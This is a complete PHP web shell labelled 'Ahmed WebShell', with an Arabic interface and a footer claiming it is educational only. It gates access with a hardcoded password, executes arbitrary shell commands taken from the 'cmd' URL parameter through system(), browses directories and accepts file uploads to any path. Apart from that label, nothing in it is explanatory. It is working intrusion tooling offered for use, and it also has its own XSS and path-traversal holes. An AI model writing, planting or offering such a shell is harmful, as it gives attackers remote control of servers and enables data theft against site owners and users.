<?php
session_start();

$PASSWORD = "#2025#";

if (!isset($_SESSION['authenticated'])) {
    if (isset($_POST['pass']) && $_POST['pass'] === $PASSWORD) {
        $_SESSION['authenticated'] = true;
    } else {
        echo '<form method="POST" style="margin: 20px;"><input type="password" name="pass" placeholder="كلمة المرور" />
              <input type="submit" value="دخول" /></form>';
        exit;
    }
}

function executeCommand($cmd) {
    echo "<pre style='background:#111;color:#0f0;padding:10px;border-radius:8px;'>\n";
    system($cmd);
    echo "</pre>";
}

function listFiles($path) {
    echo "<h3>📁 المحتويات داخل: $path</h3><ul>";
    foreach(scandir($path) as $file) {
        $full = $path . DIRECTORY_SEPARATOR . $file;
        if ($file === '.') continue;
        $color = is_dir($full) ? 'lightblue' : 'white';
        $link = "?path=" . urlencode($full);
        echo "<li><a href='$link' style='color:$color;'>$file</a></li>";
    }
    echo "</ul>";
}

if (isset($_FILES['upload'])) {
    $dest = $_GET['path'] ?? __DIR__;
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest . "/" . $_FILES['upload']['name'])) {
        echo "<p style='color:lime;'>✔️ تم رفع الملف بنجاح!</p>";
    } else {
        echo "<p style='color:red;'>❌ فشل في رفع الملف!</p>";
    }
}

$cwd = $_GET['path'] ?? getcwd();
echo "<h2 style='color: cyan;'>🌐 Ahmed WebShell [تعليمي] - المسار الحالي: $cwd</h2>";
echo "<form method='POST' enctype='multipart/form-data'>
    <input type='file' name='upload'>
    <input type='submit' value='رفع الملف'>
    <input type='hidden' name='path' value='".htmlspecialchars($cwd)."'>
</form>";

echo "<form method='GET'><input type='text' name='cmd' placeholder='أمر لتنفيذه' style='width:300px;'>
      <input type='hidden' name='path' value='".htmlspecialchars($cwd)."'>
      <input type='submit' value='تنفيذ'></form>";

if (isset($_GET['cmd'])) {
    echo "<h3>💻 نتيجة الأمر:</h3>";
    chdir($cwd);
    executeCommand($_GET['cmd']);
}

listFiles($cwd);

echo "<hr><p style='color:gray;'>📌 تعليمي فقط - برمجة أحمد طاهر</p>";
?>